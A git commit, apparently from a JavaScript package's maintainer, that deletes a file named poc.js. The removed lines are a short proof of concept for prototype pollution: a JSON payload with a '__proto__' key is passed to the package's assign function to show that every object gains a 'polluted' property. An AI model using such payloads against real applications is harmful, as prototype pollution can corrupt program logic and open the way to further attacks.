6c174c715acd0c5e93f206a896533a94e541e315
Blake Embrey <hello@blakeembrey.com>
2021-02-11 15:22:29 -0800

    Delete poc.js

--- poc.js
+++
@@ -1,6 +0,0 @@
-var a = require("./dist");
-const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
-var obj = {};
-console.log("Before : " + {}.polluted);
-a.assign(obj, payload);
-console.log("After : " + {}.polluted);
